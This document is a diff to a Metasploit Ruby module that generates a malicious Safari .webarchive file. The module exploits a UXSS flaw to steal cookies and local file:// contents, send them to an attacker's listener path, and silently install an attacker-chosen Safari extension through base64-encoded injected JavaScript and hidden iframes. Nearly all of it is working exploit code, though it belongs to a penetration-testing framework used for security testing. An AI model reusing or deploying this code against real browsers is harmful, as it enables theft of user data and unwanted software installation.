@@ -1,23 +1,26 @@
-#safari.installExtension("com.pinterest.extension-HWZFLG9PNK","http://assets.pinterest.com/ext/Pinterest-Safari.safariextz")
-
+#
+# The WebArchive mixin provides methods for generating a Safari .webarchive file
+# that performs a variety of malicious tasks: stealing files, cookies, and silently
+# installing extensions from extensions.apple.com.
+#
 module Msf
 module Format
 module Webarchive
 
   def initialize(info={})
     super
-    register_options(
-      [
-        OptString.new('FILENAME', [ true, 'The file name',  'msf.webarchive']),
-        OptString.new('GRABPATH', [false, "The URI to receive the UXSS'ed data", 'grab']),
-        OptString.new('DOWNLOAD_PATH', [ true, 'The path to download the webarchive', '/msf.webarchive']),
-        OptString.new('FILE_URLS', [false, 'Additional file:// URLs to steal. $USER will be resolved to the username.', '']),
-        OptBool.new('STEAL_COOKIES', [true, "Enable cookie stealing", true]),
-        OptBool.new('STEAL_FILES', [true, "Enable local file stealing", true]),
-        OptString.new('EXTENSION_URL', [false, "HTTP URL of a Safari extension to install"]),
-        OptString.new('EXTENSION_ID', [false, "The ID of the Safari extension to install"])
-      ],
-      self.class)
+    register_options([
+      OptString.new("URIPATH", [false, 'The URI to use for this exploit (default is random)']),
+      OptString.new('FILENAME', [ true, 'The file name',  'msf.webarchive']),
+      OptString.new('GRABPATH', [false, "The URI to receive the UXSS'ed data", 'grab']),
+      OptString.new('DOWNLOAD_PATH', [ true, 'The path to download the webarchive', '/msf.webarchive']),
+      OptString.new('FILE_URLS', [false, 'Additional file:// URLs to steal. $USER will be resolved to the username.', '']),
+      OptBool.new('STEAL_COOKIES', [true, "Enable cookie stealing", true]),
+      OptBool.new('STEAL_FILES', [true, "Enable local file stealing", true]),
+      OptBool.new('INSTALL_EXTENSION', [true, "Silently install a Safari extensions (requires click)", false]),
+      OptString.new('EXTENSION_URL', [false, "HTTP URL of a Safari extension to install", "https://data.getadblock.com/safari/AdBlock.safariextz"]),
+      OptString.new('EXTENSION_ID', [false, "The ID of the Safari extension to install", "com.betafish.adblockforsafari-UAMUU4S2D9"])
+    ], self.class)
   end
 
   ### ASSEMBLE THE WEBARCHIVE XML ###
@@ -90,8 +93,7 @@ module Webarchive
   def iframes_container_html
     hidden_style = "position:fixed; left:-600px; top:-600px;"
     wrap_with_doc do
-      frames = "<iframe src='#{apple_extension_url}' style='#{hidden_style}'></iframe>"
-      communication_js + frames + injected_js_helpers + steal_files + install_extension + message
+      communication_js + injected_js_helpers + steal_files + install_extension + message
     end
   end
 
@@ -115,18 +117,23 @@ module Webarchive
   end
 
   def install_extension
+    return '' unless datastore['INSTALL_EXTENSION']
+    raise "EXTENSION_URL datastore option missing" unless datastore['EXTENSION_URL'].present?
+    raise "EXTENSION_ID datastore option missing" unless datastore['EXTENSION_ID'].present?
     wrap_with_script do
       %Q|
       var extURL = atob('#{Rex::Text.encode_base64(datastore['EXTENSION_URL'])}');
       var extID = atob('#{Rex::Text.encode_base64(datastore['EXTENSION_ID'])}');
 
-      setTimeout(function(){
+      window.onclick = function(){
+        x = window.open('#{apple_extension_url}', 'x');
+
         function go(){
           window.focus();
           window.open('javascript:safari&&(safari.installExtension\|\|(window.top.location.href.match(/extensions/)&&window.top.location.reload(false)))&&(safari.installExtension("'+extID+'", "'+extURL+'"), window.close());', 'x')
         }
         setInterval(go, 400);
-      }, 600);
+      };
 
       |
     end
@@ -326,7 +333,7 @@ function reportStolenCookies() {
 
   # @return [String] the path to send data back to
   def collect_data_uri
-    '/' + datastore["URIPATH"].chomp('/').gsub(/^\//, '') + '/'+datastore["GRABPATH"]
+    '/' + (datastore["URIPATH"] || '').chomp('/').gsub(/^\//, '') + '/'+datastore["GRABPATH"]
   end
 
   # @return [String] formatted http/https URL of the listener
